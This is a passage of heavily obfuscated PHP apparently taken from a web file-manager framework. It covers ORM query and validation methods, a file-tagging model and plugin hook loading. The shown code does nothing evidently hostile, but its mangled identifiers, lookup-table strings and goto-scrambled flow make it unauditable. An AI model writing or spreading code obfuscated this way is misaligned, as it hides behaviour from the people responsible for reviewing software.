$f¥¥®…•á‚[$D‚×Ç‰÷ßƒ] = $dÙíÉ’ÖµÌ[$D‚×Ç‰÷ßƒ]; } } else { $f¥¥®…•á‚[$CáµœŠ†¾¶[0]] = $dÙíÉ’ÖµÌ[$CáµœŠ†¾¶[0]]; } if (!empty($dÙíÉ’ÖµÌ[$this->getPk()])) { $f¥¥®…•á‚[$this->getPk()] = array($C¹¥°äƒ[327], $dÙíÉ’ÖµÌ[$this->getPk()]); } if ($this->where($f¥¥®…•á‚)->find()) { return !1; } return !0; default: return $this->check($dÙíÉ’ÖµÌ[$CáµœŠ†¾¶[0]], $CáµœŠ†¾¶[1], $CáµœŠ†¾¶[4]); } } public function check($Dœ¦¥³é‹ø, $dà·Çñ¥, $d·§¬åÅŸ = "\162\x65\x67\145\170") { $B¤ó›¶Ö =& $_SERVER[¹Ò‹Ò¹]; $d·§¬åÅŸ = strtolower(trim($d·§¬åÅŸ)); switch ($d·§¬åÅŸ) { case $B¤ó›¶Ö[7]: case $B¤ó›¶Ö[328]: $Bãˆ±Š• = is_array($dà·Çñ¥) ? $dà·Çñ¥ : explode($B¤ó›¶Ö[47], $dà·Çñ¥); return $d·§¬åÅŸ == $B¤ó›¶Ö[7] ? in_array($Dœ¦¥³é‹ø, $Bãˆ±Š•) : !in_array($Dœ¦¥³é‹ø, $Bãˆ±Š•); case $B¤ó›¶Ö[329]: case $B¤ó›¶Ö[330]: if (is_array($dà·Çñ¥)) { $E‰ÙÜåòµ¬ = $dà·Çñ¥[0]; $aå´÷’³‘› = $dà·Çñ¥[1]; } else { list($E‰ÙÜåòµ¬, $aå´÷’³‘›) = explode($B¤ó›¶Ö[47], $dà·Çñ¥); } return $d·§¬åÅŸ == $B¤ó›¶Ö[329] ? $Dœ¦¥³é‹ø >= $E‰ÙÜåòµ¬ && $Dœ¦¥³é‹ø <= $aå´÷’³‘› : $Dœ¦¥³é‹ø < $E‰ÙÜåòµ¬ || $Dœ¦¥³é‹ø > $aå´÷’³‘›; case $B¤ó›¶Ö[331]: case $B¤ó›¶Ö[332]: return $d·§¬åÅŸ == $B¤ó›¶Ö[331] ? $Dœ¦¥³é‹ø == $dà·Çñ¥ : $Dœ¦¥³é‹ø != $dà·Çñ¥; case $B¤ó›¶Ö[333]: $Aë©¯ˆâ¿Ã = mb_strlen($Dœ¦¥³é‹ø, $B¤ó›¶Ö[334]); if (strpos($dà·Çñ¥, $B¤ó›¶Ö[47])) { list($E‰ÙÜåòµ¬, $aå´÷’³‘›) = explode($B¤ó›¶Ö[47], $dà·Çñ¥); return $Aë©¯ˆâ¿Ã >= $E‰ÙÜåòµ¬ && $Aë©¯ˆâ¿Ã <= $aå´÷’³‘›; } else { return $Aë©¯ˆâ¿Ã == $dà·Çñ¥; } case $B¤ó›¶Ö[335]: list($e†¾“Ü¾ñğ, $câ†ŞÍ§Ö¶) = explode($B¤ó›¶Ö[47], $dà·Çñ¥); if (!is_numeric($e†¾“Ü¾ñğ)) { $e†¾“Ü¾ñğ = strtotime($e†¾“Ü¾ñğ); } if (!is_numeric($câ†ŞÍ§Ö¶)) { $câ†ŞÍ§Ö¶ = strtotime($câ†ŞÍ§Ö¶); } return NOW_TIME >= $e†¾“Ü¾ñğ && NOW_TIME <= $câ†ŞÍ§Ö¶; case $B¤ó›¶Ö[336]: return in_array(get_client_ip(), explode($B¤ó›¶Ö[47], $dà·Çñ¥)); case $B¤ó›¶Ö[337]: return !in_array(get_client_ip(), explode($B¤ó›¶Ö[47], $dà·Çñ¥)); case $B¤ó›¶Ö[324]: default: return $this->regex($Dœ¦¥³é‹ø, $dà·Çñ¥); } } public function query($Fêš‡ˆ…ô, $a³ä‘¤ö© = false) { $BÍ ’ƒëŸé =& $_SERVER[¹Ò‹Ò¹]; if (!is_bool($a³ä‘¤ö©) && !is_array($a³ä‘¤ö©)) { $a³ä‘¤ö© = func_get_args(); array_shift($a³ä‘¤ö©); } $Fêš‡ˆ…ô = str_replace(array($BÍ ’ƒëŸé[227], $BÍ ’ƒëŸé[338]), $BÍ ’ƒëŸé[50], $Fêš‡ˆ…ô); $Fêš‡ˆ…ô = $this->parseSql($Fêš‡ˆ…ô, $a³ä‘¤ö©); return $this->db->query($Fêš‡ˆ…ô); } public function execute($d«Ñ›Õ™—™, $EÖ’Ïæ¤ùä = false) { if (!is_bool($EÖ’Ïæ¤ùä) && !is_array($EÖ’Ïæ¤ùä)) { $EÖ’Ïæ¤ùä = func_get_args(); array_shift($EÖ’Ïæ¤ùä); } $d«Ñ›Õ™—™ = $this->parseSql($d«Ñ›Õ™—™, $EÖ’Ïæ¤ùä); return $this->db->execute($d«Ñ›Õ™—™); } protected function parseSql($F½ó›¿ÎÔ, $EÇèÎ©¯‹ä) { $Aª öÛÚ™ =& $_SERVER[¹Ò‹Ò¹]; if (!0 === $EÇèÎ©¯‹ä) { $DÎÏ×ØÔØ = $this->_parseOptions(); $F½ó›¿ÎÔ = $this->db->parseSql($F½ó›¿ÎÔ, $DÎÏ×ØÔØ); } elseif (is_array($EÇèÎ©¯‹ä)) { $EÇèÎ©¯‹ä = array_map(array($this->db, $Aª öÛÚ™[339]), $EÇèÎ©¯‹ä); $F½ó›¿ÎÔ = vsprintf($F½ó›¿ÎÔ, $EÇèÎ©¯‹ä); } else { $F½ó›¿ÎÔ = strtr($F½ó›¿ÎÔ, array($Aª öÛÚ™[340] => $this->getTableName(), $Aª öÛÚ™[341] => think_config($Aª öÛÚ™[240]))); } $this->db->setModel($this->name); return $F½ó›¿ÎÔ; } public function db($Aï¡ßÛ‹é = '', $fãÕ›Æõ‡Á = '', $e•Ê“”… = array()) { goto cÆ„šíÚ; Ağİ£®Ôå‚: static $aÀÑäªïŞé = array(); if (!isset($aÀÑäªïŞé[$Aï¡ßÛ‹é]) || isset($aÀÑäªïŞé[$Aï¡ßÛ‹é]) && $fãÕ›Æõ‡Á && $e—ÎÇæ™Ú[$Aï¡ßÛ‹é] != $fãÕ›Æõ‡Á) { if (!empty($fãÕ›Æõ‡Á) && is_string($fãÕ›Æõ‡Á) && !1 === strpos($fãÕ›Æõ‡Á, $EíŒÅâ«æ†[8])) { $fãÕ›Æõ‡Á = think_config($fãÕ›Æõ‡Á); } $aÀÑäªïŞé[$Aï¡ßÛ‹é] = Db::getInstance($fãÕ›Æõ‡Á); } elseif (NULL === $fãÕ›Æõ‡Á) { $aÀÑäªïŞé[$Aï¡ßÛ‹é]->close(); unset($aÀÑäªïŞé[$Aï¡ßÛ‹é]); return; } if (!empty($e•Ê“”…)) { if (is_string($e•Ê“”…)) { parse_str($e•Ê“”…, $e•Ê“”…); } foreach ($e•Ê“”… as $F„Òêê©®ê => $Cìª‰­è‹«) { $this->setProperty($F„Òêê©®ê, $Cìª‰­è‹«); } } goto EêË—‡‡ª¿; cÆ„šíÚ: $EíŒÅâ«æ† =& $_SERVER[¹Ò‹Ò¹]; if ($EíŒÅâ«æ†[33] === $Aï¡ßÛ‹é && $this->db) { return $this->db; } static $e—ÎÇæ™Ú = array(); goto Ağİ£®Ôå‚; EêË—‡‡ª¿: $e—ÎÇæ™Ú[$Aï¡ßÛ‹é] = $fãÕ›Æõ‡Á; $this->db = $aÀÑäªïŞé[$Aï¡ßÛ‹é]; $this->_after_db(); goto F“¾‰ˆÙÀ®; F“¾‰ˆÙÀ®: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto F¿­øæ¾¿ã; F¿­øæ¾¿ã: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $a§°ì—É´Ú = get_class($this); if ($a§°ì—É´Ú == $_SERVER[¹Ò‹Ò¹][342]) { return $this->name; } $this->name = substr($a§°ì—É´Ú, 0, -5); } return $this->name; } public function getTableName() { $Cø¿ÛÃ¶ Š =& $_SERVER[¹Ò‹Ò¹]; if (empty($this->trueTableName)) { $A“è¯îèÎ” = !empty($this->tablePrefix) ? $this->tablePrefix : $Cø¿ÛÃ¶ Š[33]; if (!empty($this->tableName)) { $A“è¯îèÎ” .= $this->tableName; } else { $A“è¯îèÎ” .= think_parse_name($this->name); } $this->trueTableName = strtolower($A“è¯îèÎ”); } return (!empty($this->dbName) ? $this->dbName . $Cø¿ÛÃ¶ Š[94] : $Cø¿ÛÃ¶ Š[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $f®Ãîò—Æ =& $_SERVER[¹Ò‹Ò¹]; return isset($this->fields[$f®Ãîò—Æ[247]]) ? $this->fields[$f®Ãîò—Æ[247]] : $this->pk; } public function getDbFields() { $b¬ÚÕš¯Œï =& $_SERVER[¹Ò‹Ò¹]; if (isset($this->options[$b¬ÚÕš¯Œï[275]])) { $A±šÁˆãõ = $this->db->getFields($this->options[$b¬ÚÕš¯Œï[275]]); return $A±šÁˆãõ ? array_keys($A±šÁˆãõ) : !1; } if ($this->fields) { $A±šÁˆãõ = $this->fields; unset($A±šÁˆãõ[$b¬ÚÕš¯Œï[246]], $A±šÁˆãõ[$b¬ÚÕš¯Œï[247]], $A±šÁˆãõ[$b¬ÚÕš¯Œï[248]], $A±šÁˆãõ[$b¬ÚÕš¯Œï[245]]); return $A±šÁˆãõ; } return !1; } public function data($f¡ê‰ÄƒÒ = '') { $e±Ö§èÁ¬ =& $_SERVER[¹Ò‹Ò¹]; if ($e±Ö§èÁ¬[33] === $f¡ê‰ÄƒÒ && !empty($this->data)) { return $this->data; } if (is_object($f¡ê‰ÄƒÒ)) { $f¡ê‰ÄƒÒ = get_object_vars($f¡ê‰ÄƒÒ); } elseif (is_string($f¡ê‰ÄƒÒ)) { parse_str($f¡ê‰ÄƒÒ, $f¡ê‰ÄƒÒ); } elseif (!is_array($f¡ê‰ÄƒÒ)) { think_exception(think_lang($e±Ö§èÁ¬[267])); } $this->data = $f¡ê‰ÄƒÒ; return $this; } public function join($c¢ì‡¹­¼Õ) { $Fº°ªÆ°Õö =& $_SERVER[¹Ò‹Ò¹]; if (is_array($c¢ì‡¹­¼Õ)) { $this->options[$Fº°ªÆ°Õö[278]] = $c¢ì‡¹­¼Õ; } elseif (!empty($c¢ì‡¹­¼Õ)) { $this->options[$Fº°ªÆ°Õö[278]][] = $c¢ì‡¹­¼Õ; } return $this; } public function union($Dî›óÆ­´¡, $FÖôµÅÛ¾ = false) { goto cÄ¸”‹–Èì; Aïœ¨‚µ˜†: return $this; goto føœìÁª×; aÍó‹Üñ­Ì: if (is_object($Dî›óÆ­´¡)) { $Dî›óÆ­´¡ = get_object_vars($Dî›óÆ­´¡); } if (is_string($Dî›óÆ­´¡)) { $aöôŸèïÕÚ = $Dî›óÆ­´¡; } elseif (is_array($Dî›óÆ­´¡)) { if (isset($Dî›óÆ­´¡[0])) { $this->options[$cÑºäöÌ™ö[343]] = array_merge($this->options[$cÑºäöÌ™ö[343]], $Dî›óÆ­´¡); return $this; } else { $aöôŸèïÕÚ = $Dî›óÆ­´¡; } } else { think_exception(think_lang($cÑºäöÌ™ö[267])); } $this->options[$cÑºäöÌ™ö[343]][] = $aöôŸèïÕÚ; goto Aïœ¨‚µ˜†; cÄ¸”‹–Èì: $cÑºäöÌ™ö =& $_SERVER[¹Ò‹Ò¹]; if (empty($Dî›óÆ­´¡)) { return $this; } if ($FÖôµÅÛ¾) { $this->options[$cÑºäöÌ™ö[343]][$cÑºäöÌ™ö[344]] = !0; } goto aÍó‹Üñ­Ì; føœìÁª×: } public function cache($eõİ‚Œß¼á = true, $Bã”ê¶ Ü› = null, $D£à„†¶Å = '') { $Aìì×ó…¾ =& $_SERVER[¹Ò‹Ò¹]; if (!1 !== $eõİ‚Œß¼á) { $this->options[$Aìì×ó…¾[345]] = array($Aìì×ó…¾[92] => $eõİ‚Œß¼á, $Aìì×ó…¾[335] => $Bã”ê¶ Ü›, $Aìì×ó…¾[29] => $D£à„†¶Å); } return $this; } public function field($D‚òÛÁ˜Ÿ, $F‚´ÕÎø¹ = false) { $Cø«ßÑ°” =& $_SERVER[¹Ò‹Ò¹]; if (!0 === $D‚òÛÁ˜Ÿ) { $dâ´Ä£Œ£Ç = $this->getDbFields(); $D‚òÛÁ˜Ÿ = $dâ´Ä£Œ£Ç ? $dâ´Ä£Œ£Ç : $Cø«ßÑ°”[181]; } elseif ($F‚´ÕÎø¹) { if (is_string($D‚òÛÁ˜Ÿ)) { $D‚òÛÁ˜Ÿ = explode($Cø«ßÑ°”[47], $D‚òÛÁ˜Ÿ); } $dâ´Ä£Œ£Ç = $this->getDbFields(); $D‚òÛÁ˜Ÿ = $dâ´Ä£Œ£Ç ? array_diff($dâ´Ä£Œ£Ç, $D‚òÛÁ˜Ÿ) : $D‚òÛÁ˜Ÿ; } $this->options[$Cø«ßÑ°”[269]] = $D‚òÛÁ˜Ÿ; return $this; } public function scope($C÷ƒÃÆæÚ® = '', $D¿ËÆÀ™¹… = NULL) { $EÊŞ–î…Š© =& $_SERVER[¹Ò‹Ò¹]; if ($EÊŞ–î…Š©[33] === $C÷ƒÃÆæÚ®) { if (isset($this->_scope[$EÊŞ–î…Š©[34]])) { $Béï×  å‰ = $this->_scope[$EÊŞ–î…Š©[34]]; } else { return $this; } } elseif (is_string($C÷ƒÃÆæÚ®)) { $c‘°Š“ÉÃ’ = explode($EÊŞ–î…Š©[47], $C÷ƒÃÆæÚ®); $Béï×  å‰ = array(); foreach ($c‘°Š“ÉÃ’ as $c‹ï˜Ÿ¯ƒ) { if (!isset($this->_scope[$c‹ï˜Ÿ¯ƒ])) { continue; } $Béï×  å‰ = array_merge($Béï×  å‰, $this->_scope[$c‹ï˜Ÿ¯ƒ]); } if (!empty($D¿ËÆÀ™¹…) && is_array($D¿ËÆÀ™¹…)) { $Béï×  å‰ = array_merge($Béï×  å‰, $D¿ËÆÀ™¹…); } } elseif (is_array($C÷ƒÃÆæÚ®)) { $Béï×  å‰ = $C÷ƒÃÆæÚ®; } if (is_array($Béï×  å‰) && !empty($Béï×  å‰)) { $this->options = array_merge($this->options, array_change_key_case($Béï×  å‰)); } return $this; } public function where($e¶…¾ìå¬Œ, $FÕ±ˆ¦• = null) { $a‹µ‚¹ñÜ» =& $_SERVER[¹Ò‹Ò¹]; if (!is_null($FÕ±ˆ¦•) && is_string($e¶…¾ìå¬Œ)) { if (!is_array($FÕ±ˆ¦•)) { $FÕ±ˆ¦• = func_get_args(); array_shift($FÕ±ˆ¦•); } $FÕ±ˆ¦• = array_map(array($this->db, $a‹µ‚¹ñÜ»[339]), $FÕ±ˆ¦•); $e¶…¾ìå¬Œ = vsprintf($e¶…¾ìå¬Œ, $FÕ±ˆ¦•); } elseif (is_object($e¶…¾ìå¬Œ)) { $e¶…¾ìå¬Œ = get_object_vars($e¶…¾ìå¬Œ); } elseif (is_array($e¶…¾ìå¬Œ)) { foreach ($e¶…¾ìå¬Œ as $DÕ¾’ññ‚Ê => $eÂóŸ„‡éì) { if ((is_numeric($DÕ¾’ññ‚Ê) || !$DÕ¾’ññ‚Ê) && is_string($eÂóŸ„‡éì)) { if (strpos($eÂóŸ„‡éì, $a‹µ‚¹ñÜ»[346]) === 0) { continue; } think_trace($a‹µ‚¹ñÜ»[347], $a‹µ‚¹ñÜ»[33], $a‹µ‚¹ñÜ»[46]); die; } } } if (is_string($e¶…¾ìå¬Œ) && $a‹µ‚¹ñÜ»[33] != $e¶…¾ìå¬Œ) { $D–¾Àİ•¼É = array(); $D–¾Àİ•¼É[$a‹µ‚¹ñÜ»[348]] = $e¶…¾ìå¬Œ; $e¶…¾ìå¬Œ = $D–¾Àİ•¼É; } if (isset($this->options[$a‹µ‚¹ñÜ»[271]])) { $this->options[$a‹µ‚¹ñÜ»[271]] = array_merge($this->options[$a‹µ‚¹ñÜ»[271]], $e¶…¾ìå¬Œ); } else { $this->options[$a‹µ‚¹ñÜ»[271]] = $e¶…¾ìå¬Œ; } return $this; } public function limit($D‰À„±ÙÖ†, $A„©¯¼Ø˜Ñ = null) { $AÉˆ¾È÷ƒ =& $_SERVER[¹Ò‹Ò¹]; $this->options[$AÉˆ¾È÷ƒ[288]] = is_null($A„©¯¼Ø˜Ñ) ? $D‰À„±ÙÖ† : $D‰À„±ÙÖ† . $AÉˆ¾È÷ƒ[47] . $A„©¯¼Ø˜Ñ; return $this; } public function page($E†œÛÑ¤®ß, $e©êÎÔ¡Ï¦ = null) { $b»ìÙòˆ¨ =& $_SERVER[¹Ò‹Ò¹]; $this->options[$b»ìÙòˆ¨[349]] = is_null($e©êÎÔ¡Ï¦) ? $E†œÛÑ¤®ß : $E†œÛÑ¤®ß . $b»ìÙòˆ¨[47] . $e©êÎÔ¡Ï¦; return $this; } public function comment($eºÛ‹¸àå) { $this->options[$_SERVER[¹Ò‹Ò¹][350]] = $eºÛ‹¸àå; return $this; } public function setProperty($d¯áÎßï¦, $a‘ÁÅÀõóè) { if (property_exists($this, $d¯áÎßï¦)) { $this->{$d¯áÎßï¦} = $a‘ÁÅÀõóè; } return $this; } } goto B…†¼ï¡; b›‹âĞšÜ¾: class GroupTagModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\137\x66\x61\166"; protected function cacheFunctionAlias($cãØ…õò‘£) { $DĞ¬‰Í´¾Ç =& $_SERVER[¹Ò‹Ò¹]; return array($DĞ¬‰Í´¾Ç[1769] => array($cãØ…õò‘£[0], $DĞ¬‰Í´¾Ç[1770]), $DĞ¬‰Í´¾Ç[1771] => array($cãØ…õò‘£[0], $DĞ¬‰Í´¾Ç[1772])); } protected function get($C»Ò¨ÃÛ¿Ñ) { $e…·‚‰ÆÚƒ =& $_SERVER[¹Ò‹Ò¹]; $dÇ®æÃ¨„õ = Model($e…·‚‰ÆÚƒ[480])->metaGet($C»Ò¨ÃÛ¿Ñ, $e…·‚‰ÆÚƒ[1773]); $c«äÉèÅÌĞ = json_decode($dÇ®æÃ¨„õ, !0); return $c«äÉèÅÌĞ ? $c«äÉèÅÌĞ : array($e…·‚‰ÆÚƒ[1774] => $e…·‚‰ÆÚƒ[86], $e…·‚‰ÆÚƒ[365] => array()); } protected function set($c÷àãÀ»Íò, $d”­èœ«á©) { $Dì¶ÁÌ¡×¥ =& $_SERVER[¹Ò‹Ò¹]; $d”­èœ«á© = $d”­èœ«á© ? $d”­èœ«á© : array($Dì¶ÁÌ¡×¥[1774] => $Dì¶ÁÌ¡×¥[86], $Dì¶ÁÌ¡×¥[365] => array()); Model($Dì¶ÁÌ¡×¥[480])->metaSet($c÷àãÀ»Íò, $Dì¶ÁÌ¡×¥[1773], json_encode($d”­èœ«á©)); return Model($Dì¶ÁÌ¡×¥[480])->metaSet($c÷àãÀ»Íò, $Dì¶ÁÌ¡×¥[1773], json_encode($d”­èœ«á©)); } protected function getByTagID($EËŠİÏÄÀ«, $B„Ñ“œÄìƒ) { goto bòêòÄ­Ü; CŠŞÍñÓõù: $e¤ˆŠíøæì = $this->get($EËŠİÏÄÀ«); if (!$e¤ˆŠíøæì || !isset($e¤ˆŠíøæì[$EĞƒæ§¸ã³[365]])) { return !1; } $f¥ç½æâ·Ó = array_find_by_field($e¤ˆŠíøæì[$EĞƒæ§¸ã³[365]], $EĞƒæ§¸ã³[388], $B„Ñ“œÄìƒ); goto Cå‰œ­šÜ÷; Cå‰œ­šÜ÷: return is_array($f¥ç½æâ·Ó) ? $f¥ç½æâ·Ó : !1; goto eíœ£…·´; bòêòÄ­Ü: $EĞƒæ§¸ã³ =& $_SERVER[¹Ò‹Ò¹]; if (!$EËŠİÏÄÀ« || !$B„Ñ“œÄìƒ) { return !1; } if (!Model($EĞƒæ§¸ã³[480])->getInfoSimple($EËŠİÏÄÀ«)) { return !1; } goto CŠŞÍñÓõù; eíœ£…·´: } public function listSource($f“©¡Œò, $fàİŞ‹• Ë) { goto BäÉÒ†Ê; BäÉÒ†Ê: $F‡­‡ÅÔ·¤ =& $_SERVER[¹Ò‹Ò¹]; if ($fàİŞ‹• Ë && !is_array($fàİŞ‹• Ë)) { $fàİŞ‹• Ë = array($fàİŞ‹• Ë); } $cÅ‰™‚¸×† = $this->listData($f“©¡Œò); goto A¡ÀöœĞ¨; dùŸÂ¤²¿: if (!$eâæ—ö‘¾ƒ || count($f÷ŞÖ‹¹ğ) == $eâæ—ö‘¾ƒ[$F‡­‡ÅÔ·¤[362]][$F‡­‡ÅÔ·¤[363]]) { return $eâæ—ö‘¾ƒ; } $BÍÓç¢§áö = array(); $Eïôà­…äì = array_to_keyvalue($eâæ—ö‘¾ƒ[$F‡­‡ÅÔ·¤[74]], $F‡­‡ÅÔ·¤[33], $F‡­‡ÅÔ·¤[390]); goto D¹×’„±Ÿ; FïÎ¡µÃ“¥: foreach ($cé¼†ÖàÔÉ as $bÖæƒñ³à => $F¾—ßÙ®”) { $A¹÷î‡­Í‚ = !0; if (!$fàİŞ‹• Ë) { $f÷ŞÖ‹¹ğ[] = $bÖæƒñ³à; continue; } foreach ($fàİŞ‹• Ë as $D’–’„) { if (!in_array($D’–’„, $F¾—ßÙ®”)) { $A¹÷î‡­Í‚ = !1; break; } } if ($A¹÷î‡­Í‚) { $f÷ŞÖ‹¹ğ[] = $bÖæƒñ³à; } } if (!$f÷ŞÖ‹¹ğ) { return array(); } $eâæ—ö‘¾ƒ = Model($F‡­‡ÅÔ·¤[1179])->listSource(array($F‡­‡ÅÔ·¤[404] => array($F‡­‡ÅÔ·¤[405], $f÷ŞÖ‹¹ğ))); goto dùŸÂ¤²¿; d¦ÀÛ«Ÿ‡ò: if ($BÍÓç¢§áö) { $this->removeBySource($f“©¡Œò, $BÍÓç¢§áö); } return $eâæ—ö‘¾ƒ; goto FŒø‹¶Ÿ; A¡ÀöœĞ¨: $cé¼†ÖàÔÉ = array(); foreach ($cÅ‰™‚¸×† as $E Õ•’ì¡) { $cˆÏØÑˆ‰ä = $E Õ•’ì¡[$F‡­‡ÅÔ·¤[75]]; if (!$cˆÏØÑˆ‰ä) { continue; } if (!isset($cé¼†ÖàÔÉ[$cˆÏØÑˆ‰ä])) { $cé¼†ÖàÔÉ[$cˆÏØÑˆ‰ä] = array(); } $cé¼†ÖàÔÉ[$cˆÏØÑˆ‰ä][] = $E Õ•’ì¡[$F‡­‡ÅÔ·¤[413]]; } $f÷ŞÖ‹¹ğ = array(); goto FïÎ¡µÃ“¥; D¹×’„±Ÿ: $e…â·ğØ¸¼ = array_to_keyvalue($eâæ—ö‘¾ƒ[$F‡­‡ÅÔ·¤[73]], $F‡­‡ÅÔ·¤[33], $F‡­‡ÅÔ·¤[390]); $b‘‰Í£áˆÁ = array_merge($e…â·ğØ¸¼, $Eïôà­…äì); foreach ($f÷ŞÖ‹¹ğ as $cˆÏØÑˆ‰ä) { if (!in_array($cˆÏØÑˆ‰ä, $b‘‰Í£áˆÁ)) { $BÍÓç¢§áö[] = $cˆÏØÑˆ‰ä; } } goto d¦ÀÛ«Ÿ‡ò; FŒø‹¶Ÿ: } protected function listData($CÒ‰†èÉ³—) { $cÈ…³£ğˆˆ =& $_SERVER[¹Ò‹Ò¹]; $c¨ç»Äæùò = array($cÈ…³£ğˆˆ[1496] => 0, $cÈ…³£ğˆˆ[457] => array($cÈ…³£ğˆˆ[1775], 0), $cÈ…³£ğˆˆ[409] => $cÈ…³£ğˆˆ[1776] . $CÒ‰†èÉ³—); $aÅÁÎÈæÜƒ = $cÈ…³£ğˆˆ[1777]; $bŸÌ‘½…ñ = $this->field($aÅÁÎÈæÜƒ)->where($c¨ç»Äæùò)->order($cÈ…³£ğˆˆ[1778])->select(); return $bŸÌ‘½…ñ ? $bŸÌ‘½…ñ : array(); } protected function addToTag($f¾ƒÌÀö¦, $D™æÊŞ®¸», $aØ¼Ï™¨ä) { $BÁ·ŞØøƒ =& $_SERVER[¹Ò‹Ò¹]; if (!$this->getByTagID($f¾ƒÌÀö¦, $aØ¼Ï™¨ä) || !$D™æÊŞ®¸») { return !1; } if (!Model($BÁ·ŞØøƒ[769])->pathInfo($D™æÊŞ®¸»)) { return !1; } $Fåâ˜Ò½ø¡ = array($BÁ·ŞØøƒ[1496] => 0, $BÁ·ŞØøƒ[457] => $aØ¼Ï™¨ä, $BÁ·ŞØøƒ[408] => $D™æÊŞ®¸», $BÁ·ŞØøƒ[409] => $BÁ·ŞØøƒ[1779] . $f¾ƒÌÀö¦, $BÁ·ŞØøƒ[407] => $BÁ·ŞØøƒ[33], $BÁ·ŞØøƒ[1671] => 0); if ($this->where($Fåâ˜Ò½ø¡)->find()) { return !1; } return $this->add($Fåâ˜Ò½ø¡); } protected function removeFromTag($f¬ˆİìäˆ, $DĞÌ¼Ï«…, $dİÇÓ‘ô²‡) { $E¬Äœ´ç†Ç =& $_SERVER[¹Ò‹Ò¹]; if (!$this->getByTagID($f¬ˆİìäˆ, $dİÇÓ‘ô²‡) || !$DĞÌ¼Ï«…) { return !1; } if (is_array($DĞÌ¼Ï«…)) { $DĞÌ¼Ï«… = array($E¬Äœ´ç†Ç[7], $DĞÌ¼Ï«…); } $c„…òÔÂÓ = array($E¬Äœ´ç†Ç[1496] => 0, $E¬Äœ´ç†Ç[457] => $dİÇÓ‘ô²‡, $E¬Äœ´ç†Ç[409] => $E¬Äœ´ç†Ç[1779] . $f¬ˆİìäˆ, $E¬Äœ´ç†Ç[408] => $DĞÌ¼Ï«…); return $this->where($c„…òÔÂÓ)->delete(); } protected function removeByTag($cà­ƒŸé®ä, $d¶­¶ÖÊÚÓ) { $dÂ„ß‰çÈ =& $_SERVER[¹Ò‹Ò¹]; if (!$this->getByTagID($cà­ƒŸé®ä, $d¶­¶ÖÊÚÓ)) { return !1; } $D†¼ÂªŠ‘Æ = array($dÂ„ß‰çÈ[1496] => 0, $dÂ„ß‰çÈ[457] => $d¶­¶ÖÊÚÓ, $dÂ„ß‰çÈ[409] => $dÂ„ß‰çÈ[1779] . $cà­ƒŸé®ä); return $this->where($D†¼ÂªŠ‘Æ)->delete(); } protected function removeBySource($FÊ˜î¤±š¼, $A¾”Çˆ‹–) { $B½ÒØ«Ÿ†– =& $_SERVER[¹Ò‹Ò¹]; if (!$FÊ˜î¤±š¼ || !$A¾”Çˆ‹–) { return !1; } if (is_array($A¾”Çˆ‹–)) { $A¾”Çˆ‹– = array($B½ÒØ«Ÿ†–[7], $A¾”Çˆ‹–); } $cõÂí»ù´ = array($B½ÒØ«Ÿ†–[1496] => 0, $B½ÒØ«Ÿ†–[408] => $A¾”Çˆ‹–, $B½ÒØ«Ÿ†–[457] => array($B½ÒØ«Ÿ†–[947], 0), $B½ÒØ«Ÿ†–[409] => $B½ÒØ«Ÿ†–[1779] . $FÊ˜î¤±š¼); return $this->where($cõÂí»ù´)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\155\56\160\154\165\147\151\156\x4c\151\x73\x74"; public $field = array("\156\x61\x6d\145", "\x73\164\x61\164\x75\x73", "\x72\145\147\151\x65\x73\x74", "\143\x6f\156\146\x69\x67"); public function loadList($Dœø¡»®Å” = false) { $CŠ”—ÜáÆ = array_to_keyvalue($this->listData(), $_SERVER[¹Ò‹Ò¹][28]); if ($Dœø¡»®Å”) { return $CŠ”—ÜáÆ[$Dœø¡»®Å”]; } return $CŠ”—ÜáÆ; } public function init() { $d‚¤­İŞèğ =& $_SERVER[¹Ò‹Ò¹]; Hook::trigger($d‚¤­İŞèğ[1780]); $dÊñ–ÚË = $this->loadPluginList(); foreach ($dÊñ–ÚË as $B«§ï¢§È³ => $aÕµ„á¸Âš) { $a­Î·Œ˜ëà = $this->appAllow($B«§ï¢§È³, $aÕµ„á¸Âš); if (!$a­Î·Œ˜ëà) { continue; } foreach ($aÕµ„á¸Âš[$d‚¤­İŞèğ[1781]] as $fá»”òµŒ¤ => $F¦§†¸ÅÄ¼) { Hook::bind($fá»”òµŒ¤, $F¦§†¸ÅÄ¼); } } Hook::trigger($d‚¤­İŞèğ[1782]); Hook::trigger(ACTION); } public function appAllow($d‹š…Ü‚, $cÒÊ²çïÆÚ, $DÂ˜ëæÄË = true) { $c™ª‰ÄÖÎÚ =& $_SERVER[¹Ò‹Ò¹]; $f×¡Ñğèî» = PLUGIN_DIR . $d‹š…Ü‚ . $c™ª‰ÄÖÎÚ[1783]; if (!is_array($cÒÊ²çïÆÚ) || !is_array($cÒÊ²çïÆÚ[$c™ª‰ÄÖÎÚ[1781]]) || $cÒÊ²çïÆÚ[$c™ª‰ÄÖÎÚ[704]] != 1 || !is_file($f×¡Ñğèî»)) { return !1; } if ($GLOBALS[$c™ª‰ÄÖÎÚ[479]] == 1) { return !0; } if ($DÂ˜ëæÄË && !Action($c™ª‰ÄÖÎÚ[1784])->checkAuth($d‹š…Ü‚)) { return !1; } return !0; } public function unInstall($f•®½ØŠµ) { $a’¦ŠšÑ‡ =& $_SERVER[¹Ò‹Ò¹]; $Aº‡•©‰ô = $this->loadList($f•®½ØŠµ); if (file_exists(PLUGIN_DIR . $f•®½ØŠµ)) { Hook::apply($f•®½ØŠµ . $a’¦ŠšÑ‡[1785]); } $this->remove($Aº‡•©‰ô[$a’¦ŠšÑ‡[388]]); } public function changeStatus($e Ï™İ”œÀ, $Bš‹ÓŸˆ¿É) { $D‘¢ôù‡Ş =& $_SERVER[¹Ò‹Ò¹]; $fŞ©ÔÅ–À— = $this->loadList($e Ï™İ”œÀ); if ($Bš‹ÓŸˆ¿É) { Hook::apply($e Ï™İ”œÀ . $D‘¢ôù‡Ş[1786]); } $this->update($fŞ©ÔÅ–À—[$D‘¢ôù‡Ş[388]], array($D‘¢ôù‡Ş[1787] => 